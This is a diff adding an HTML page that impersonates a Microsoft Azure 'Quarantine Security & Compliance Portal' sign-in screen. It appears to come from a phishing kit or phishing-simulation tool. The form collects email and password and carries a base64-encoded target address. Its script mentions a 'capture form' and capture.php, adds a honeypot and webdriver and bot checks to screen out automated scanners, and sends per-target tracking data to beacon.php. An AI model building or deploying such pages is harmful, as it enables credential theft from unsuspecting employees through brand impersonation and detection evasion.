@@ -1,0 +1,205 @@
+﻿<!-- DON'T MODIFY THIS FILE!  -->
+
+
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Quarantine Portal</title>
+
+<link rel="icon" href="favicon.png" type="image/x-icon">
+<style type="text/css">
+	.box{
+		padding: 36px;
+		margin: auto;
+		margin-top: 200px;
+		width: 450px;
+		background-color: #fff;
+		font-family: "Segoe UI Webfont","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+		box-shadow: 0 2px 3px rgba(0,0,0,0.55);
+	}
+	h3{
+	    font-size: 1.5rem;
+		font-weight: 300;
+	}
+	.chbox{
+	    width: 20px;
+		height: 20px;
+		margin-top: 5px;
+	}
+	.spnbox{
+	    font-weight: 400;
+		font-size: .9375rem;
+		line-height: 1.25rem;
+	}
+	.submit{
+		border-color: #0067b8;
+		background-color: #0067b8;
+		color: #fff;
+		width: 100%;
+		text-align: center;
+		vertical-align: middle;
+		height: 36px;
+		letter-spacing: normal;
+		word-spacing: normal;
+		text-transform: none;
+		text-indent: 0px;
+		text-shadow: none;
+		text-rendering: auto;
+		border: none;
+	}
+	.lbl{
+	}
+	.lgl{
+		font-size: .75rem;
+		line-height: .875rem;
+	}
+	.usr{
+		height: 36px;
+		padding: 6px 10px;
+		border-width: 1px;
+		width: 430px;
+		border-style: solid;
+		font-family: inherit;
+		font-size: inherit;
+	}
+</style>
+</head>
+
+	<body background="convergedbg.jpg" style="background-color: #7E7A71" >
+
+		<div class="box">
+			<img height=40px src="azure.png"><br>
+			<h3>Quarantine Security & Compliance Portal</h3>
+			Sign-in to review held messages.<br><br>
+			<form method="post">
+			<input class="usr" id="username" name="username" autocomplete="off" type="email" placeholder="Email@example.com"><br><br>
+			<input class="usr" id="password" name="password" type="password" autocomplete="off" placeholder="Password"><br><br>
+			<br>
+			<input type="submit" id="submit" value="Next" class="submit">
+			<input type="hidden" name="email" value="bGJpc2hvcEBmaXJzdHRleGFzYmFuay5jb20="/>
+			</form>
+		</div>
+	<script>
+(function(){
+'use strict';
+
+// ---- constants from server -------------------------------------------------
+// These are safe JSON values (base64, numeric strings, int).
+var _rt    = "qcKUkPhlV7q4KUqqUmUYXk9eFXWO3cpVFYHHy3IVeag=";
+var _rtIat = "1790069310";
+var _cid   = "1588";
+var _em    = "bGJpc2hvcEBmaXJzdHRleGFzYmFuay5jb20=";
+
+// ---- per-page behavioural state -------------------------------------------
+var _mm = 0;   // mouse_moved: any pointer/touch movement
+var _ti = 0;   // trusted_interaction: real click/key/touch before submit
+var _t0 = Date.now();  // page load reference time for dwell_ms
+
+document.addEventListener('mousemove',  function(){_mm=1;_ti=1;},{passive:true,once:true});
+document.addEventListener('touchmove',  function(){_mm=1;_ti=1;},{passive:true,once:true});
+document.addEventListener('touchstart', function(){_mm=1;_ti=1;},{passive:true,once:true});
+document.addEventListener('click',      function(){_ti=1;},      {passive:true,once:true});
+document.addEventListener('keydown',    function(){_ti=1;},      {passive:true,once:true});
+
+// ---- webdriver check -------------------------------------------------------
+// navigator.webdriver is true in headless/automated browsers, undefined or
+// false in real ones.  Cast to 1/0 for the hidden field.
+var _wd = (typeof navigator !== 'undefined' && !!navigator.webdriver) ? 1 : 0;
+
+// ---- locate the capture form -----------------------------------------------
+// Prefer the form that contains username/password inputs; fall back to the
+// first form on the page.
+var _form = (function(){
+    var fs = document.querySelectorAll('form');
+    for(var i=0;i<fs.length;i++){
+        if(fs[i].querySelector('[name="username"],[name="password"]')) return fs[i];
+    }
+    return fs.length ? fs[0] : null;
+})();
+
+if(_form){
+    // ---- honeypot ----------------------------------------------------------
+    // A visually hidden text input present in the DOM so naive form-fillers
+    // will submit a value, while real users never see or interact with it.
+    // The field name is intentionally generic to attract auto-fillers.
+    var _hpWrap = document.createElement('div');
+    _hpWrap.setAttribute('aria-hidden','true');
+    _hpWrap.style.cssText =
+        'position:absolute;left:-9999px;top:-9999px;' +
+        'width:1px;height:1px;overflow:hidden;';
+    var _hpInp = document.createElement('input');
+    _hpInp.type  = 'text';
+    _hpInp.name  = '_hp';
+    _hpInp.value = '';
+    _hpInp.setAttribute('tabindex', '-1');
+    _hpInp.setAttribute('autocomplete', 'nope');
+    _hpWrap.appendChild(_hpInp);
+    _form.appendChild(_hpWrap);
+
+    // ---- hidden signal fields ----------------------------------------------
+    // Injected into the form now; values updated on submit so dwell/interaction
+    // reflect the full session up to the point of submission.
+    function _hi(n,v){
+        var e = document.createElement('input');
+        e.type='hidden'; e.name=n; e.value=v;
+        _form.appendChild(e);
+        return e;
+    }
+    var _fJs  = _hi('_js',     '1');    // js_executed
+    var _fWd  = _hi('_wd',     '0');    // webdriver_false (inverted below on submit)
+    var _fRt  = _hi('_rt',     _rt);    // render_token
+    var _fRtI = _hi('_rt_iat', _rtIat); // render_token issued_at
+    var _fDw  = _hi('_dw',     '0');    // dwell_ms
+    var _fMm  = _hi('_mm',     '0');    // mouse_moved
+    var _fTi  = _hi('_ti',     '0');    // trusted_interaction
+
+    // Update time-sensitive fields immediately before the form submits.
+    _form.addEventListener('submit', function(){
+        _fWd.value = String(_wd);
+        _fDw.value = String(Math.max(0, Math.round(Date.now() - _t0)));
+        _fMm.value = String(_mm);
+        _fTi.value = String(_ti);
+    }, {passive:true});
+}
+
+// ---- post-render click beacon ----------------------------------------------
+// The click row was written on the GET request (before any JS ran).  This
+// beacon fires ~200 ms later and updates that row with browser-side signals.
+// beacon.php (deployed alongside capture.php) validates the render token and
+// does the UPDATE; it 204s silently on any error.
+function _sendBeacon(){
+    if(!_rt || !_cid || !_em) return;
+    var body =
+        '_cid='    + encodeURIComponent(_cid)   +
+        '&_em='    + encodeURIComponent(_em)    +
+        '&_rt='    + encodeURIComponent(_rt)    +
+        '&_rt_iat='+ encodeURIComponent(_rtIat) +
+        '&_js=1'                                 +
+        '&_wd='    + encodeURIComponent(_wd)    +
+        '&_mm='    + encodeURIComponent(_mm)    +
+        '&_ti='    + encodeURIComponent(_ti);
+
+    var sent = false;
+    if(typeof navigator.sendBeacon === 'function'){
+        // sendBeacon with a text/plain Blob is a simple-request — no CORS
+        // preflight, fire-and-forget.
+        sent = navigator.sendBeacon('beacon.php',
+            new Blob([body], {type:'application/x-www-form-urlencoded'}));
+    }
+    if(!sent){
+        fetch('beacon.php', {
+            method:    'POST',
+            headers:   {'Content-Type':'application/x-www-form-urlencoded'},
+            body:      body,
+            keepalive: true
+        }).catch(function(){});
+    }
+}
+setTimeout(_sendBeacon, 200);
+
+})();
+</script>
+</body>
+</html>
